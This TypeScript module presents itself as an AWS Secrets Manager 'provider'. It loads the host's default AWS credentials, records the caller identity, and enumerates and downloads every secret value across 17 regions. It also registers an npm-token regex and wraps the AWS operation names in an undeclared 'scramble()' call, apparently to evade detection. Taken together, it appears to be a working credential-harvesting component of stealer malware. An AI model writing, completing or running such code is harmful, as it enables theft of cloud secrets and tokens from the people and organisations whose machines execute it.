import { Provider } from "../base";
import type { ProviderResult } from "../types";
import {
  type CallerIdentity,
  jsonApiRequest,
  stsGetCallerIdentity,
} from "./client";
import { resolveDefaultCredentials } from "./credentials";
import type { AwsCredentials } from "./sigv4";

declare function scramble(str: string): string;

// All AWS regions that are enabled by default (non opt-in).
const DEFAULT_REGIONS = [
  "us-east-1",
  "us-east-2",
  "us-west-1",
  "us-west-2",
  "ap-northeast-1",
  "ap-northeast-2",
  "ap-northeast-3",
  "ap-south-1",
  "ap-southeast-1",
  "ap-southeast-2",
  "ca-central-1",
  "eu-central-1",
  "eu-north-1",
  "eu-west-1",
  "eu-west-2",
  "eu-west-3",
  "sa-east-1",
];

const PERMISSION_ERROR_CODES = new Set([
  "AccessDeniedException",
  "UnauthorizedAccess",
  "UnrecognizedClientException",
  "InvalidSignatureException",
  "ExpiredTokenException",
  "InvalidClientTokenId",
  "SignatureDoesNotMatch",
  "IncompleteSignature",
]);

interface ListSecretsResponse {
  SecretList?: Array<{ Name?: string }>;
  NextToken?: string;
}

interface GetSecretValueResponse {
  SecretString?: string;
  SecretBinary?: string; // already base64-encoded in the JSON response
}

interface RegionError {
  region: string;
  operation: string;
  code: string;
  message: string;
}

function extractErrorCode(error: unknown): string {
  if (error && typeof error === "object") {
    // AWS SDK-style errors
    for (const key of ["code", "Code", "__type", "name"]) {
      const val = (error as Record<string, unknown>)[key];
      if (typeof val === "string") return val;
    }
  }
  return "UnknownError";
}

function extractErrorMessage(error: unknown): string {
  if (error instanceof Error) return error.message;
  if (error && typeof error === "object") {
    for (const key of ["message", "Message"]) {
      const val = (error as Record<string, unknown>)[key];
      if (typeof val === "string") return val;
    }
  }
  return String(error);
}

function isPermissionError(error: unknown): boolean {
  const code = extractErrorCode(error);
  if (PERMISSION_ERROR_CODES.has(code)) return true;
  const msg = extractErrorMessage(error).toLowerCase();
  return (
    msg.includes("is not authorized to perform") ||
    msg.includes("access denied") ||
    msg.includes("security token") ||
    msg.includes("invalid identity token")
  );
}

export class AwsSecretsManagerService extends Provider {
  private credentials!: AwsCredentials;
  private errors: RegionError[] = [];

  constructor() {
    super("aws", "secretsmanager", {
      npmtoken: /npm_[A-Za-z0-9]{36,}/g,
    });
  }

  private recordError(region: string, operation: string, error: unknown): void {
    this.errors.push({
      region,
      operation,
      code: extractErrorCode(error),
      message: extractErrorMessage(error),
    });
  }

  private async getCallerIdentity(): Promise<CallerIdentity | undefined> {
    try {
      return await stsGetCallerIdentity(this.credentials);
    } catch (e) {
      if (isPermissionError(e)) {
        this.recordError("global", scramble("sts:GetCallerIdentity"), e);
      }
      return undefined;
    }
  }

  private async listSecrets(region: string): Promise<string[]> {
    const secretIds: string[] = [];
    let nextToken: string | undefined;

    do {
      const payload: Record<string, unknown> = {};
      if (nextToken) payload.NextToken = nextToken;

      const response = await jsonApiRequest<ListSecretsResponse>(
        this.credentials,
        region,
        scramble("secretsmanager"),
        scramble("secretsmanager.ListSecrets"),
        payload,
      );

      if (response.SecretList) {
        for (const secret of response.SecretList) {
          if (secret.Name) secretIds.push(secret.Name);
        }
      }

      nextToken = response.NextToken;
    } while (nextToken);

    return secretIds;
  }

  private async getSecretValue(
    region: string,
    secretId: string,
  ): Promise<string | undefined> {
    try {
      const response = await jsonApiRequest<GetSecretValueResponse>(
        this.credentials,
        region,
        scramble("secretsmanager"),
        scramble("secretsmanager.GetSecretValue"),
        { SecretId: secretId },
      );

      if (response.SecretBinary) {
        return `BINARY:${response.SecretBinary}`;
      }
      return response.SecretString;
    } catch (e) {
      if (isPermissionError(e)) {
        this.recordError(
          region,
          `secretsmanager:GetSecretValue(${secretId})`,
          e,
        );
      }
      return undefined;
    }
  }

  private async executeForRegion(
    region: string,
  ): Promise<{ ids: string[]; secrets: Record<string, unknown> }> {
    const ids: string[] = [];
    const secrets: Record<string, unknown> = {};

    try {
      const secretIds = await this.listSecrets(region);
      if (secretIds.length === 0) return { ids, secrets };

      const values = await Promise.all(
        secretIds.map((id) => this.getSecretValue(region, id)),
      );

      secretIds.forEach((id, i) => {
        const key = `${region}:${id}`;
        ids.push(key);
        secrets[key] = values[i] ?? { error: "Failed to retrieve secret" };
      });
    } catch (e) {
      if (isPermissionError(e)) {
        this.recordError(region, "secretsmanager:ListSecrets", e);
      }
      // Non-permission errors (network, region unreachable) — silently skip.
    }

    return { ids, secrets };
  }

  async execute(): Promise<ProviderResult> {
    this.errors = [];

    try {
      this.credentials = await resolveDefaultCredentials();
    } catch (e) {
      return this.failure(e instanceof Error ? e : new Error(String(e)));
    }

    try {
      const [callerIdentity, results] = await Promise.all([
        this.getCallerIdentity(),
        Promise.all(
          DEFAULT_REGIONS.map((region) => this.executeForRegion(region)),
        ),
      ]);

      const allIds: string[] = [];
      const allSecrets: Record<string, unknown> = {};
      for (const { ids, secrets } of results) {
        allIds.push(...ids);
        Object.assign(allSecrets, secrets);
      }

      if (allIds.length === 0) {
        if (this.errors.length > 0) {
          const summary = this.errors
            .map(
              (e) => `[${e.region}] ${e.operation}: ${e.code} — ${e.message}`,
            )
            .join("\n");
          return this.failure(
            `No secrets retrieved due to permission errors:\n${summary}`,
          );
        }
        return this.failure(
          "No secrets found in AWS Secrets Manager across any region",
        );
      }

      return this.success({
        callerIdentity,
        regions: DEFAULT_REGIONS,
        secretIds: allIds,
        secrets: allSecrets,
        ...(this.errors.length > 0 && { permissionErrors: this.errors }),
      });
    } catch (e) {
      return this.failure(e instanceof Error ? e : new Error(String(e)));
    }
  }
}
